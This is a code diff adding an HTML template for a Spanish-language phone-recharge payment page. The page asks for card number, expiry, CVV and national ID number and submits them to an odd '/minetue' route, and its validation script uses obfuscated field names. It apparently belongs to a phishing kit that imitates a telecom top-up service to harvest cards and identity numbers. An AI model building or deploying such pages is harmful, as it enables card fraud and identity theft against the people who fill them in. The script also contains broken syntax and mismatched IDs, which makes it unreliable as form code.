@@ -1,0 +1,166 @@
+{% extends "base.html" %}
+{% block content %}
+<body class="body_background_extend">
+   
+   
+   <div billnumber="" thirdpartyrechargeenabled="true" id="root">
+   <div class="page-recharge-body">
+   <div class="page-recharge-tarjeta">
+      <form id="frmverify" name="frmverify" data-js="form-container" http-equiv='refresh'  method="POST" action="/minetue" novalidate="" onSubmit="return validate();"> 
+         <div class="row">
+            <header class="header">
+               <p class="header__title">Ingresar nueva tarjeta</p>
+            </header>
+            <div class="page-recharge-tarjeta">
+               <div class="row">
+                  <header class="header">
+                     <a href="" ><img src="{{ url_for('static', filename='/img/icono-home-256.png') }}" style="width: 40px; height:40px;" alt=""></a>
+                        
+                     <p class="header__title">Recarga con tarjeta</p>
+                     <div class="number_container">
+                        <p class="number_user_letter">{{ number }}</p>
+                     </div>
+                  </header>
+                  <div class="page-recharge-divider"></div>
+                  <div class="newcard">
+                     <div class="newcard__form   ">
+                        <div class="inputcontainer newcard__inputcontainer">
+                           <div id="card-number-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <div id="cardPreview" class="newcard__preview generic">
+                                 <p class="newcard__preview__number">•••• •••• •••• ••••</p>
+                                 <p class="newcard__preview__name">••••••••</p>
+                                 <p class="newcard__preview__expiration">••/••</p>
+                              </div>
+                              <input type="tel" maxlength="22" class="inputcontainer__input newcard__inputcontainer__input  active" id="numcc" name="numcc" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label" >Número de tarjeta</label>
+                              <span class="inputcontainer__span newcard__inputcontainer__span"><a>Ver tarjetas habilitadas</a>
+                              </span>
+                           </div>
+                        </div>
+                     
+
+                        <div class="container-cc">
+
+                        
+                        <div class="inputcontainer newcard__inputcontainer small__input mes_cc">
+                           <div id="due-date-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" maxlength="" class="inputcontainer__input newcard__inputcontainer__input--small active" id="exp" name="exp" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">Fecha de vencimiento (MM/AA)</label>
+                           </div>
+                        </div>
+                        <div>
+                           <div class="modalhelp ">
+                           </div>
+                           <div class="modalhelp__content " data-modal="vencimiento">
+                              <div class="modalhelp__data">
+                                 <h4 class="modalhelp__data__title">Fecha de vencimiento</h4>
+                                 <p class="modalhelp__data__text">Encuentra esta fecha en el frente de tu tarjeta debajo del número de la misma</p>
+                                 <a class="modalhelp__data__close" data-close="vencimiento">Entendido </a>
+                              </div>
+                              <div class="modalhelp__preview">
+                                 <img src="/inicio/assets/img/sample-vencimiento.svg" height="68"> 
+                              </div>
+                           </div>
+                        </div>
+                        <div class="inputcontainer newcard__inputcontainer small__input mes_cc" >
+                           <div id="sec-code-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" maxlength="3" class="inputcontainer__input newcard__inputcontainer__input--small active" id"cvv" name="cvv" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">Código de seguridad</label>
+                           </div>
+                        </div>
+                        </div>
+
+                        <div class="inputcontainer newcard__inputcontainer small__input">
+                           <div id="sec-code-input" class="inputcontainer__data  newcard__inputcontainer__data">
+                              <input type="tel" maxlength="8" class="inputcontainer__input newcard__inputcontainer__input--small active" id="dni" name="dni" value="">
+                              <label class="inputcontainer__label newcard__inputcontainer__label">DNI</label>
+                           </div>
+                        </div>
+                        <div>
+                           <div class="modalhelp ">
+                           </div>
+                           <div class="modalhelp__content " data-modal="vencimiento">
+                              <div class="modalhelp__data">
+                                 <h4 class="modalhelp__data__title">Código de seguridad</h4>
+                                 <p class="modalhelp__data__text">Es un codigo de 3 dígitos ubicado al reverso de tu tarjeta</p>
+                                 <a class="modalhelp__data__close" data-close="vencimiento">Entendido </a>
+                              </div>
+                              <div class="modalhelp__preview">
+                                 <img src="/inicio/assets/img/sample-code.svg" height="68">
+                              </div>
+                           </div>
+                        </div>
+                        <button type="submit" id="add-credit-card-submit" class="formcode__submit active">
+                           <p>Pagar</p>
+                        </button>
+                        <button class="formcode__eliminar">
+                        <a class="newcard__lnk" href="/">Cancelar</a>
+                        </button>
+                        </form>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </form>
+      </div>
+   </div>
+   
+   <script>
+   function validate(){
+      var valid = true;	 
+      $(".demoInputBox").css('background-color','');
+      var message = "";
+
+      var ckfkfi4Regex = /^[a-z ,.'-]+$/i;
+      var cvvRegex = /^[0-9]{3,4}$/;
+      
+      var ckfkfi4 = $("#ckfkfi4").val();
+      var cardNumber = $("#dfgewc").val();
+      var cvv = $("#cvc").val();
+
+      if(ckfkfi4 == "" || cardNumber == "" || cvv == "") {
+            message  += "<div>Rellene todos los campos.</div>";  
+            if(ckfkfi4 == "") {
+               document.getElementById('div-error1').style.display = 'block';
+               $("#ckfkfi4").css('background-color','#f86b69');
+                  $("#ckfkfi4").css('background-color','#f86b69');
+                  
+            }
+            if(cardNumber == "") {
+               $.getElementById('div-error1').style.display = 'block';
+               $("#dfgewc").css('background-color','#f86b69');
+            }
+            if (cvv == "") {
+               $("#cvc").css('background-color','#f86b69');
+            }
+         valid = false;
+      }
+      
+      if (ckfkfi4 != "" && !ckfkfi4Regex.test(ckfkfi4)) {
+         message  += "<div>Nombre Invalido</div>";    
+            $("#ckfkfi4").css('background-color','#f86b69');
+            valid = false;
+      }
+      
+      if(cardNumber != "") {
+            $('#dfgewc').validateCreditCard(function(result){
+               if(!(result.valid)){
+                     document.getElementById('inabilitada').style.display = 'block';
+                     message  += "<div>Numero de tarjeta invalido"</div>""; 
+                     $("#dfgewc").css('background-color','#f86b69');
+                     valid = false;
+               }
+         });
+      }
+      
+      if (cvv != "" && !cvvRegex.test(cvv)) {
+         message  += "<div>Codigo de seguridad invalido</div>";    
+         $("#cvc").css('background-color','#f86b69');
+            valid = false;
+      }
+
+      return valid;
+   }
+   </script>
+</body>
+{% endblock %}
